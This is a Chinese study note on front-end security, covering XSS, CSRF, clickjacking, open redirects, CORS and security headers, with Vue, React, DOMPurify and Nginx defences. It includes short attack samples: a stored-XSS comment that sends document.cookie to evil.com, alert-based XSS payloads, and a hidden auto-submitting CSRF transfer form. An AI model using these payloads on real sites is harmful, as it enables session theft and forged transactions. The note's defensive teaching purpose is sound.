---
title: 前端安全-XSS-CSRF防护
tags: [前端安全, XSS, CSRF, CSP, Web安全, 原子笔记]
category: 前端开发
created: 2026-08-12
updated: 2026-09-01
difficulty: ⭐⭐
status: ✅ 内容已完善
priority: 核心
pre: []
aliases: [前端安全-XSS-CSRF防护]
---



# 前端安全-XSS-CSRF防护

> **文档说明**：系统讲解前端 Web 安全的核心威胁与防护，包括 XSS（反射型/存储型/DOM型）、CSRF、点击劫持、CORS 配置、安全响应头，以及 Vue/React 安全实践和完整防御体系。
>
> **适用人群**：前端开发者、全栈开发者、需要构建安全 Web 应用的开发者
>
> **前置知识**：[[常见攻击与防御手段]]、[[密码学基础-对称非对称哈希]]、[[API安全最佳实践]]

---

## 一、概述

### 1. 前端安全威胁全景

```text
前端主要安全威胁：
- XSS（跨站脚本攻击）：注入恶意脚本
- CSRF（跨站请求伪造）：冒用用户身份发请求
- 点击劫持（Clickjacking）：透明层诱导点击
- 开放重定向（Open Redirect）：跳转到恶意网站
- CORS 配置错误：跨域数据泄露
- 敏感信息泄露：API Key、Token 暴露
- 依赖漏洞：第三方库安全漏洞
- 传输安全：HTTPS 配置、混合内容
```

### 2. 安全原则

```text
前端安全核心原则：
1. 永远不信任用户输入（所有输入都可能是恶意的）
2. 输出编码（根据上下文转义）
3. 最小权限（Token 最小权限、短期有效）
4. 纵深防御（多层防护，不依赖单一措施）
5. 安全默认（默认安全配置，而非默认开放）
6. 持续监控（日志、告警、异常检测）
```

---

## 二、XSS 跨站脚本攻击

### 1. XSS 类型

```text
XSS（Cross-Site Scripting）：攻击者在网页中注入恶意脚本

三种类型：
1. 反射型 XSS（Reflected）
   - 恶意脚本来自 URL 参数
   - 服务器反射回页面
   - 需要诱导用户点击恶意链接
   - 例：搜索结果页直接显示搜索词

2. 存储型 XSS（Stored/Persistent）
   - 恶意脚本存储在服务器（数据库）
   - 所有访问该页面的用户都会受影响
   - 危害最大
   - 例：评论区、用户资料、论坛帖子

3. DOM 型 XSS（DOM-based）
   - 完全发生在客户端
   - 恶意脚本通过修改 DOM 执行
   - 服务器不参与
   - 例：JS 直接把 URL hash 写入 innerHTML
```

### 2. XSS 攻击示例

```html
<!-- 反射型 XSS 示例 -->
<!-- 搜索页：http://example.com/search?q=<script>alert(1)</script> -->
<!-- 后端直接输出搜索词 -->
<p>搜索结果: <?php echo $_GET['q']; ?></p>
<!-- 结果：<p>搜索结果: <script>alert(1)</script></p> -->

<!-- 存储型 XSS 示例 -->
<!-- 用户评论提交：<script>fetch('http://evil.com/steal?c='+document.cookie)</script> -->
<!-- 评论存储在数据库，所有用户查看时执行 -->

<!-- DOM 型 XSS 示例 -->
<script>
  // 直接把 URL 参数写入 DOM
  document.getElementById('output').innerHTML = location.hash.slice(1);
</script>
<!-- 访问：http://example.com/#<img src=x onerror=alert(1)> -->
```

### 3. XSS 危害

```text
XSS 可以做什么：
- 窃取 Cookie / Session Token（document.cookie）
- 劫持用户会话（冒充用户操作）
- 窃取敏感信息（密码、银行卡、个人数据）
- 钓鱼（伪造登录框）
- 挖矿（Cryptojacking）
- 键盘记录（Keylogger）
- 重定向到恶意网站
- 控制浏览器（BeEF 框架）
- 内网扫描（利用浏览器作为代理）
```

---

## 三、XSS 防御

### 1. 输出编码（核心防御）

```text
根据输出上下文选择编码方式：

1. HTML 内容：< → &lt;  > → &gt;  & → &amp;  " → &quot;  ' → &#x27;
2. HTML 属性：除上述外，空格也要编码
3. JavaScript：Unicode 转义（\uXXXX）
4. URL：encodeURIComponent
5. CSS：严格限制，最好不要把用户输入放入 CSS
```

```javascript
// HTML 转义函数
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// 使用
const userInput = '<script>alert(1)</script>';
element.innerHTML = escapeHtml(userInput);  // 安全
// 输出：&lt;script&gt;alert(1)&lt;/script&gt;

// Vue/React 默认自动转义
// Vue: {{ userInput }} 自动转义
// React: {userInput} 自动转义
// 危险：v-html / dangerouslySetInnerHTML
```

### 2. Vue 安全实践

```vue
<template>
  <!-- ✅ 安全：{{ }} 自动转义 -->
  <div>{{ userContent }}</div>

  <!-- ❌ 危险：v-html 不转义 -->
  <div v-html="userContent"></div>

  <!-- 如果必须用 v-html，先净化 -->
  <div v-html="sanitizedContent"></div>

  <!-- ✅ 安全：绑定属性用 :attr -->
  <a :href="userUrl">链接</a>
  <!-- ❌ 危险：javascript: 协议 -->
  <!-- userUrl = "javascript:alert(1)" -->
</template>

<script setup>
import DOMPurify from 'dompurify';

const userContent = '<script>alert(1)</script>';
const sanitizedContent = DOMPurify.sanitize(userContent);  // 净化
</script>
```

### 3. React 安全实践

```jsx
// ✅ 安全：{} 自动转义
<div>{userContent}</div>

// ❌ 危险：dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ✅ 安全：净化后使用
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />

// ❌ 危险：href 中的 javascript:
<a href={userUrl}>链接</a>  // userUrl = "javascript:alert(1)"

// ✅ 安全：校验协议
const safeUrl = userUrl.startsWith('http://') || userUrl.startsWith('https://')
  ? userUrl : '#';
```

### 4. CSP（内容安全策略）

```text
CSP（Content Security Policy）：
- 浏览器层的 XSS 防御
- 限制页面可以加载哪些资源
- 限制可以执行哪些脚本
- 即使注入了脚本也无法执行

关键指令：
- default-src：默认策略
- script-src：允许的脚本来源
- style-src：允许的样式来源
- img-src：允许的图片来源
- connect-src：允许的请求目标（fetch/XHR/WebSocket）
- font-src：允许的字体来源
- object-src：允许的插件来源
- frame-ancestors：允许嵌入的父页面（防点击劫持）
- form-action：允许的表单提交目标
- base-uri：允许的 base 标签
```

```nginx
# Nginx 配置 CSP 响应头
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self';
  object-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
";

# 报告模式（只报告不拦截，用于测试）
add_header Content-Security-Policy-Report-Only "
  default-src 'self';
  script-src 'self';
  report-uri /csp-report;
";
```

```html
<!-- Meta 标签方式（不推荐，功能受限） -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

### 5. HttpOnly Cookie

```text
HttpOnly Cookie：
- JavaScript 无法访问（document.cookie 读不到）
- 即使 XSS 成功也无法窃取 Cookie
- 只能由浏览器在 HTTP 请求中自动发送

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600

属性说明：
- HttpOnly：禁止 JS 访问
- Secure：只在 HTTPS 下发送
- SameSite：跨站请求是否发送（Strict/Lax/None）
- Path：Cookie 作用路径
- Domain：Cookie 作用域名
- Max-Age/Expires：有效期
```

### 6. DOMPurify（HTML 净化）

```javascript
import DOMPurify from 'dompurify';

// 基本用法
const clean = DOMPurify.sanitize(dirtyHtml);

// 配置允许的标签和属性
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title', 'target'],
  ALLOW_DATA_ATTR: false,
});

// 禁止链接
const clean = DOMPurify.sanitize(dirtyHtml, {
  FORBID_TAGS: ['a', 'script', 'style'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick'],
});

// Vue 指令
app.directive('safe-html', {
  mounted(el, binding) {
    el.innerHTML = DOMPurify.sanitize(binding.value);
  }
});
// <div v-safe-html="userContent"></div>
```

---

## 四、CSRF 跨站请求伪造

### 1. CSRF 原理

```html
CSRF（Cross-Site Request Forgery）：
- 攻击者诱导已登录用户访问恶意网站
- 恶意网站自动向目标网站发送请求
- 浏览器自动携带目标网站的 Cookie
- 目标网站误认为是用户主动操作

攻击条件：
1. 用户已登录目标网站（有有效 Cookie）
2. 用户访问攻击者控制的网站
3. 目标网站的请求只依赖 Cookie 认证

攻击示例：
<!-- 恶意网站中的隐藏表单 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.forms[0].submit();</script>

<!-- 或用 img 触发 GET 请求 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000" style="display:none">
```

### 2. CSRF 防御

#### 2.1 CSRF Token（最常用）

```text
CSRF Token 原理：
- 服务器生成随机 Token，存在 Session 中
- 表单/请求中携带该 Token
- 服务器验证 Token 是否匹配
- 攻击者网站无法获取 Token（同源策略）
```

```html
<!-- 表单中携带 Token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="随机Token">
  <input type="text" name="to">
  <input type="number" name="amount">
  <button type="submit">转账</button>
</form>
```

```javascript
// AJAX 请求中携带 Token（从 meta 标签读取）
const token = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': token  // 自定义头
  },
  body: JSON.stringify({ to: 'attacker', amount: 1000 })
});

// Axios 全局配置
axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';
```

#### 2.2 SameSite Cookie

```text
SameSite Cookie 属性：
- Strict：完全不发送跨站 Cookie（最严格）
- Lax：仅在顶级导航且 GET 请求时发送（默认，推荐）
- None：始终发送（需配合 Secure）

Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly

SameSite=Lax 的行为：
- 同站请求：发送 Cookie
- 跨站 GET 顶级导航：发送 Cookie
- 跨站 POST/iframe/img：不发送 Cookie
- 有效阻止大多数 CSRF 攻击
```

#### 2.3 验证 Referer/Origin

```text
验证请求来源：
- Referer 头：请求来源页面 URL
- Origin 头：请求来源（协议+域名+端口）
- 服务器检查是否来自可信域名

// 后端验证
if (req.headers.origin !== 'https://example.com') {
  return res.status(403).send('CSRF detected');
}

注意：
- Referer 可能被浏览器隐藏（隐私设置）
- Origin 更可靠（POST 请求一定有）
- 不能作为唯一防御手段
```

#### 2.4 自定义请求头

```text
自定义 Header 防御：
- 要求请求携带自定义头（如 X-Requested-With）
- 跨域请求需要 CORS 预检（OPTIONS）
- 简单请求不会触发预检，但自定义头会

// 前端
fetch('/api/action', {
  headers: { 'X-Requested-With': 'XMLHttpRequest' }
});

// 后端验证
if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
  return res.status(403).send('Invalid request');
}
```

### 3. CSRF 防御对比

| 方法 | 安全性 | 实现难度 | 兼容性 | 推荐 |
|------|--------|---------|--------|------|
| **CSRF Token** | 高 | 中 | 好 | ✅ 首选 |
| **SameSite Cookie** | 中高 | 低 | 现代浏览器好 | ✅ 必配 |
| **Referer/Origin** | 中 | 低 | 好 | ⚠️ 辅助 |
| **自定义 Header** | 中 | 低 | 好 | ⚠️ 辅助 |
| **重新认证** | 高 | 高 | 好 | ⚠️ 敏感操作 |

---

## 五、其他前端安全

### 1. 点击劫持（Clickjacking）

```text
点击劫持原理：
- 攻击者用 iframe 嵌入目标网站
- 在 iframe 上覆盖透明层
- 用户以为点击的是可见按钮，实际点击的是 iframe 中的按钮

防御：
1. X-Frame-Options 响应头
   - DENY：禁止任何网站嵌入
   - SAMEORIGIN：只允许同域嵌入
   - ALLOW-FROM uri：允许指定域名

2. CSP frame-ancestors
   - frame-ancestors 'none'：禁止嵌入
   - frame-ancestors 'self'：只允许同域
   - frame-ancestors https://trusted.com：允许指定域名

3. 前端 JS 防御（辅助）
if (top !== self) {
  top.location = self.location;  // 跳出 iframe
}
```

```nginx
# Nginx 配置
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;
```

### 2. 开放重定向

```text
开放重定向（Open Redirect）：
- 网站接受用户输入的 URL 并跳转
- 攻击者构造跳转到恶意网站的链接
- 用于钓鱼（看起来是可信域名，实际跳转到钓鱼网站）

示例：
https://example.com/redirect?url=https://evil.com
https://example.com/login?next=https://evil.com

防御：
1. 白名单：只允许跳转到可信域名
2. 相对路径：只允许相对路径跳转
3. 警告页：跳转到外部网站前显示警告
```

```javascript
// 安全的重定向函数
function safeRedirect(url) {
  // 只允许相对路径
  if (url.startsWith('/') && !url.startsWith('//')) {
    window.location = url;
    return;
  }
  // 白名单域名
  const allowedDomains = ['example.com', 'api.example.com'];
  try {
    const parsed = new URL(url, window.location.origin);
    if (allowedDomains.includes(parsed.hostname)) {
      window.location = url;
      return;
    }
  } catch (e) {}
  // 不合法，跳转到首页
  window.location = '/';
}
```

### 3. CORS 配置

```text
CORS（Cross-Origin Resource Sharing）：
- 浏览器的跨域资源共享机制
- 配置错误会导致数据泄露

安全配置原则：
1. 不要用 Access-Control-Allow-Origin: *（允许所有域名）
2. 不要同时用 * 和 Allow-Credentials: true（浏览器会拒绝）
3. 白名单可信域名
4. 限制允许的方法和头
5. 敏感接口不要用 CORS，用同域代理
```

```nginx
# 安全的 CORS 配置
add_header Access-Control-Allow-Origin "https://app.example.com" always;
add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE" always;
add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
add_header Access-Control-Allow-Credentials "true" always;
add_header Access-Control-Max-Age "86400" always;

# ❌ 危险配置
# add_header Access-Control-Allow-Origin "*" always;
# add_header Access-Control-Allow-Credentials "true" always;
```

### 4. 安全响应头

```nginx
# 完整安全响应头配置
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;  # 禁止 MIME 嗅探
add_header X-XSS-Protection "1; mode=block" always;  # 旧版浏览器 XSS 防护
add_header Referrer-Policy "strict-origin-when-cross-origin" always;  # Referrer 策略
add_header Content-Security-Policy "default-src 'self'" always;  # CSP
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;  # HSTS
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;  # 权限策略
```

---

## 六、依赖与构建安全

### 1. 依赖漏洞扫描

```bash
# npm 审计
npm audit
npm audit fix

# 更专业的工具
# Snyk
npx snyk test
npx snyk monitor

# depcheck（检查未使用的依赖）
npx depcheck

# 锁定依赖版本
# package-lock.json / yarn.lock / pnpm-lock.yaml
# 不要删除 lock 文件
```

### 2. 构建安全

```text
构建安全要点：
1. 不要在前端代码中硬编码密钥（API Key、Secret）
2. 环境变量区分：VITE_ 前缀的会暴露到前端
3. 敏感配置放后端，前端通过 API 获取
4. Source Map 生产环境不要公开（或加密）
5. 混淆代码（增加逆向难度，但不是安全措施）
6. Subresource Integrity（SRI）：CDN 资源完整性校验
```

```html
<!-- SRI：CDN 资源完整性校验 -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-abc123..."
        crossorigin="anonymous"></script>
```

```javascript
// Vite 环境变量
// .env
VITE_API_URL=https://api.example.com  # ✅ 前端可访问，非敏感
SECRET_KEY=your-secret-key  # ✅ 只在后端可用，前端访问不到

// 前端代码
console.log(import.meta.env.VITE_API_URL);  // 可以
console.log(import.meta.env.SECRET_KEY);     // undefined
```

---

## 七、最佳实践清单

### XSS 防御
- [ ] **永远不要信任用户输入**：所有输入都可能恶意
- [ ] **输出编码**：根据上下文（HTML/JS/URL/CSS）选择编码
- [ ] **避免 innerHTML**：用 textContent / Vue {{ }} / React {}
- [ ] **必须用 HTML 时净化**：DOMPurify
- [ ] **配置 CSP**：限制脚本来源，禁止内联脚本
- [ ] **HttpOnly Cookie**：防止 XSS 窃取 Cookie
- [ ] **输入校验**：白名单校验，不是黑名单过滤
- [ ] **URL 校验**：禁止 javascript:、data: 协议

### CSRF 防御
- [ ] **CSRF Token**：所有状态变更请求携带 Token
- [ ] **SameSite Cookie**：设置 SameSite=Lax 或 Strict
- [ ] **验证 Origin/Referer**：辅助验证
- [ ] **敏感操作重新认证**：转账、改密码等
- [ ] **GET 不修改状态**：GET 请求只读
- [ ] **自定义 Header**：AJAX 请求携带自定义头

### 通用安全
- [ ] **HTTPS 全站**：HSTS 强制 HTTPS
- [ ] **安全响应头**：CSP、X-Frame-Options、X-Content-Type-Options
- [ ] **最小权限**：Token 最小权限、短期有效
- [ ] **依赖更新**：定期审计和更新依赖
- [ ] **敏感信息不存前端**：密钥、密码放后端
- [ ] **错误信息不泄露**：生产环境不返回堆栈
- [ ] **速率限制**：防暴力破解、防 DDoS
- [ ] **日志和监控**：异常检测、安全告警

---

## 八、常见问题与排查

| 问题 | 原因 | 解决方案 |
|------|------|---------|
| **XSS 过滤被绕过** | 黑名单过滤不完整 | 用输出编码+白名单+DOMPurify |
| **CSP 阻止正常功能** | 策略太严格 | 用 Report-Only 模式测试、逐步收紧 |
| **CSRF Token 验证失败** | Token 不匹配/过期 | 检查 Token 生成和存储、刷新机制 |
| **SameSite 导致登录失效** | 跨站登录被阻止 | 用 SameSite=None+Secure 或同域登录 |
| **CORS 报错** | 配置不匹配 | 检查 Origin 白名单、方法、Credentials |
| **点击劫持防护失效** | 只配了 X-Frame-Options | 同时配 CSP frame-ancestors |
| **开放重定向被利用** | 未校验跳转 URL | 白名单域名、只允许相对路径 |
| **API Key 泄露** | 硬编码在前端 | 移到后端、用环境变量、代理请求 |
| **Source Map 泄露源码** | 生产环境公开了 sourcemap | 生产不生成或放在内网 |
| **依赖漏洞** | 依赖版本旧 | npm audit、Snyk、定期更新 |
| **混合内容警告** | HTTPS 页面加载 HTTP 资源 | 全部用 HTTPS、协议相对 URL |
| **Cookie 被盗** | 未设 HttpOnly | 设置 HttpOnly+Secure+SameSite |
| **JSON 注入** | 直接输出 JSON 到 script | 用 JSON.parse、转义 < > |
| **富文本 XSS** | 未净化用户 HTML | DOMPurify 净化、CSP 限制 |
| **上传文件 XSS** | 上传 SVG/HTML 执行脚本 | 校验文件类型、存储在不同域名、Content-Disposition |

---

## 九、关联笔记

### 安全相关
- [[常见攻击与防御手段]] · [[密码学基础-对称非对称哈希]] · [[API安全最佳实践]]
- [[Java-数据加密与脱敏]] · [[容器安全与镜像扫描]] · [[AI安全与对齐基础]]

### 前端
- [[首屏加载优化]] · [[Vue3-性能优化实战]] · [[懒加载与预加载策略]]
- [[Web性能指标与监控-LCP-FID-CLS]]

### 后端
- [[认证与授权原理-OAuth2-JWT]] · [[SpringValidation-参数校验]] · [[Java-异常体系与最佳实践]]

### 导航
- [[MOC-前端开发]] · [[MOC-计算机基础]] · [[全栈+AI工程双轨融合学习路线图]]

> **学习路径建议**：先掌握本文前端安全基础 → 深入 [[常见攻击与防御手段]] 攻防知识 → 学习 [[认证与授权原理-OAuth2-JWT]] 身份认证 → 实践 [[API安全最佳实践]] 接口安全 → 研究 [[密码学基础-对称非对称哈希]] 密码学 → 构建完整的全栈安全开发能力。
